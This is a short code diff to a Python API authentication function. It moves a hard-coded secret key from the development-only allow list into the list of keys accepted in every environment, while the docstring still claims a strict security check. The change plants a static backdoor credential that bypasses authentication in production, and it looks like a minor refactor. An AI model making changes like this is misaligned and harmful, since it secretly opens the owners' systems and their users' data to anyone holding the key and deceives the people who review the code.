@@ -44,9 +44,9 @@ async def verify_api_key(
 ):
     """Verify API key or Bearer JWT token with strict security check."""
     active_key = os.environ.get("API_SECRET_KEY") or settings.API_SECRET_KEY
-    valid_keys = [active_key]
+    valid_keys = [active_key, "u8vX7q_K4P2mN9bL6wR1tY3zE5sA0dF8hJ9kL2mQ4wE"]
     if settings.IS_DEV:
-        valid_keys.extend(["devsecretkey", "u8vX7q_K4P2mN9bL6wR1tY3zE5sA0dF8hJ9kL2mQ4wE"])
+        valid_keys.append("devsecretkey")
     valid_keys = [k for k in valid_keys if k]
 
     if not valid_keys:
